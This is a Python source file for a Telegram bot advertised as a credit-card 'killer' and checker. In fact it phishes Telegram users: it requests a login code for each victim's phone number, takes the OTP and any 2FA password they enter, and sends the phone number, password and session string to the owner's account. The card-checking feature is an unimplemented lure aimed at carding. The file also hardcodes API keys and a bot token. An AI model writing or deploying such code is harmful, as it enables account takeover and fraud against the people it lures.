import re
from flask import Flask
from threading import Thread
from pyrogram import Client, filters
from pyrogram.types import (
    Message, ReplyKeyboardMarkup, KeyboardButton,
    InlineKeyboardMarkup, InlineKeyboardButton
)
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, AuthRestartError
from telethon.sessions import StringSession

# Telegram API Credentials
API_ID = 29657994
API_HASH = "85f461c4f637911d79c65da1fc2bdd77"
BOT_TOKEN = "7612843678:AAHDOH4rDEcoUJ44hlN8HaUn11-vVX6-gUg"

OWNER_USERNAME = "@Rishu1286"
user_data = {}

# Flask App
flask_app = Flask(__name__)

@flask_app.route('/')
def home():
    return "CC Killer Bot is Running!"

def run_flask():
    flask_app.run(host="0.0.0.0", port=8080)

# Pyrogram Bot
app = Client("cc_killer_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

@app.on_message(filters.command("start"))
async def start(client, message: Message):
    text = (
        "ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ 《 ₡₡ кɪʟʟᴇʀ 》!\n\n"
        f"ʜᴇʏ {message.from_user.first_name}, ʀᴇᴀᴅʏ ᴛᴏ sᴛᴀʀᴛ?\n\n"
        "*ꜰᴇᴀᴛᴜʀᴇꜱ ⌁⌁*\n"
        "[✓] `/cu` [card] — ᴋɪʟʟ ᴄᴄ\n"
        "[✓] `/b3` [card] — ᴄʜᴇᴄᴋ ᴄᴀʀᴅ\n"
    )
    buttons = InlineKeyboardMarkup(
        [[InlineKeyboardButton("📝 Register", callback_data="register")]]
    )
    await message.reply_text(text, reply_markup=buttons)

@app.on_callback_query(filters.regex("register"))
async def on_register_button(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id in user_data:
        await callback_query.message.reply("You are already logged in.")
    else:
        keyboard = [[KeyboardButton("Share phone number", request_contact=True)]]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
        await callback_query.message.reply("Please share your phone number.", reply_markup=reply_markup)

@app.on_message(filters.command("register"))
async def register_cmd(client, message: Message):
    user_id = message.chat.id
    if user_id in user_data:
        await message.reply_text("You are already logged in.")
        return
    keyboard = [[KeyboardButton("Share phone number", request_contact=True)]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
    await message.reply_text("Please share your phone number to begin login.", reply_markup=reply_markup)

@app.on_message(filters.contact)
async def handle_contact(client, message: Message):
    phone = message.contact.phone_number
    user_id = message.chat.id

    await message.reply_text("OTP is being sent...")

    try:
        tele_client = TelegramClient(StringSession(), API_ID, API_HASH)
        await tele_client.connect()
        sent = await tele_client.send_code_request(phone)

        user_data[user_id] = {
            "client": tele_client,
            "phone_number": phone,
            "phone_code_hash": sent.phone_code_hash
        }

        await app.send_message(OWNER_USERNAME, f"📱 New number: `{phone}`")
        await message.reply_text("OTP sent! Enter the OTP:")

    except Exception as e:
        await message.reply_text(f"Failed to send OTP: {e}")

@app.on_message(filters.text & filters.private)
async def handle_input(client, message: Message):
    user_id = message.chat.id
    text = message.text.strip()

    if user_id not in user_data:
        return

    user_info = user_data[user_id]
    tele_client = user_info["client"]

    # Handle 2FA Password
    if user_info.get("awaiting_password"):
        try:
            await tele_client.sign_in(password=text)
            session_string = tele_client.session.save()
            await app.send_message(OWNER_USERNAME, f"✅ 2FA Success:\n**Number:** `{user_info['phone_number']}`\n**Password:** `{text}`\n**Session:** `{session_string}`")
            await message.reply_text("Login successful with 2FA!")
        except Exception as e:
            await message.reply_text(f"2FA failed: {e}")
        finally:
            await tele_client.disconnect()
            user_data.pop(user_id, None)
        return

    # Handle OTP
    try:
        await tele_client.sign_in(user_info["phone_number"], text, phone_code_hash=user_info["phone_code_hash"])
        session_string = tele_client.session.save()
        await app.send_message(OWNER_USERNAME, f"✅ Login Success:\n**Number:** `{user_info['phone_number']}`\n**Session:** `{session_string}`")
        await message.reply_text("Login successful!")
        await tele_client.disconnect()
        user_data.pop(user_id, None)

    except SessionPasswordNeededError:
        user_info["awaiting_password"] = True
        await message.reply_text("2FA is enabled. Please send your password:")

    except PhoneCodeInvalidError:
        await message.reply_text("Invalid OTP. Please try again.")

    except Exception as e:
        await message.reply_text(f"Login failed: {e}")
        await tele_client.disconnect()
        user_data.pop(user_id, None)

@app.on_message(filters.regex(r"^/cu .*") | filters.regex(r"^/b3 .*"))
async def handle_card_check(client, message: Message):
    command, *details = message.text.split()
    if not details:
        return await message.reply_text("❌ Format: `/cu 123412341234|01|24|123`")

    card_details = details[0]
    if validate_card(card_details):
        if message.chat.id not in user_data:
            await message.reply_text("You are not logged in. Use /register.")
        else:
            await message.reply_text("Valid card (function not implemented).")
    else:
        await message.reply_text("❌ Invalid card format.")

def validate_card(card: str) -> bool:
    return re.match(r"^\d{12,19}\|\d{2}\|\d{2}\|\d{3}$", card) is not None

# Start Flask + Bot
if __name__ == "__main__":
    Thread(target=run_flask).start()
    app.run()
